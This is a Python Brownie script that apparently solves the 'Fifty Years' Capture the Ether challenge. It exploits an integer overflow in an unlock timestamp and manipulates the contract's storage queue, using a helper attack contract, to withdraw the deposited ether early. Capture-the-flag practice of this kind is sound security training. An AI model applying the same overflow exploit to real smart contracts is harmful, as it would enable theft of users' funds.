import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    FiftyYearsChallenge,
    FiftyYearsAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
    get_web3,
)
from web3 import Web3


def main():
    player = get_account("player")
    challenge_contract = get_challenge_contract(
        FiftyYearsChallenge, "fifty_years", [player], {"from": player, "value": Web3.toWei(1, "ether")}
    )
    w3 = get_web3()

    day = 3600 * 24

    print_state(challenge_contract, w3)

    tx = challenge_contract.upsert(42, 2 ** 256 - day, {"from": player, "value": Web3.toWei(1, "wei")})
    tx.wait(1)

    print_state(challenge_contract, w3, queue_print_start=0)

    tx = challenge_contract.upsert(42, 0, {"from": player, "value": Web3.toWei(2, "wei")})
    tx.wait(1)

    print_state(challenge_contract, w3)

    attack_contract = FiftyYearsAttack.deploy(challenge_contract, {"from": player, "value": 2})
    attack_contract.attack()

    print_state(challenge_contract, w3)

    tx = challenge_contract.withdraw(2, {"from": player})
    tx.wait(1)

    print_state(challenge_contract, w3, queue_print_start=0)

    check_solution(challenge_contract.address)


def print_state(challenge_contract, w3, queue_print_start=None):
    state = get_state(challenge_contract, w3, queue_print_start)

    print("Contract balance:", state['balance'])
    print("Head:", state['head'])
    print("Queue length:", state['queue_length'])
    print()
    print("Queue:")
    for contribution in state['queue']:
        print("index:", contribution['index'])
        print("Amount:", Web3.fromWei(contribution['amount'], "ether"), "ETH")
        print("Unlock timestamp:", contribution['unlockTimestamp'])
        print()
    print()


def get_state(challenge_contract, w3, queue_print_start=None):
    queue_start = Web3.toInt(Web3.solidityKeccak(['uint256'], [0]))
    queue_length = Web3.toInt(w3.eth.get_storage_at(challenge_contract.address, 0))
    head = Web3.toInt(w3.eth.get_storage_at(challenge_contract.address, 1))
    balance = challenge_contract.balance()
    queue_print_start = queue_print_start if queue_print_start is not None else head

    queue = []
    for index in range(queue_print_start, queue_length):
        amount = w3.eth.get_storage_at(challenge_contract.address, queue_start + 2 * index)
        unlock_timestamp = w3.eth.get_storage_at(challenge_contract.address, queue_start + 2 * index + 1)
        queue.append({
            'index': index,
            'amount': Web3.toInt(amount),
            'unlockTimestamp': Web3.toInt(unlock_timestamp),
        })

    state = {
        'balance': balance,
        'queue_start': queue_start,
        'queue_length': queue_length,
        'head': head,
        'queue': queue
    }
    return state